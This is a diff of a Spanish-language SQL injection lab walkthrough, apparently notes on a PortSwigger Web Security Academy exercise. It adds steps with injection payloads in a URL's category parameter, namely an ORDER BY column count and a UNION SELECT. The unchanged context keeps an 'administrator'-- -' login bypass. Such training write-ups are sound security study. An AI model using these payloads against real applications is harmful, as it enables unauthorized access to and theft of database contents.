@@ -28,12 +28,19 @@ Ahora hay que buscar la manera que ya no regrese el error, como cerrar esa comil
 
 ![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/8a87141b-dded-420f-b75f-05439d0def77)
 
-2. Aquí encuentro donde puedo hacer inputs de strings
+2. Aquí encuentro el error
 
-![image](https://github.com/Fz3r0/Fz3r0_-_SQLi/assets/94720207/e6481b91-47f2-4b54-8cc9-0d036d9d99a1)
+3.  Salgo adelante del error y hago el conteo de columnas
 
+````
+https://0aff002b034894bd8089e9e3001100a0.web-security-academy.net/filter?category=Lifestyle' ORDER BY 3 -- -
+````
 
-3. Query que usé (lo puse en ambos campos, aunque se puede usar en el primero y el segundo lo que sea...)
+4. Acomodo las columnas
+
+````
+https://0aff002b034894bd8089e9e3001100a0.web-security-academy.net/filter?category=Lifestyle'  Union Select 1,2,3 -- -
+````
 
 ````sql
 administrator'-- -
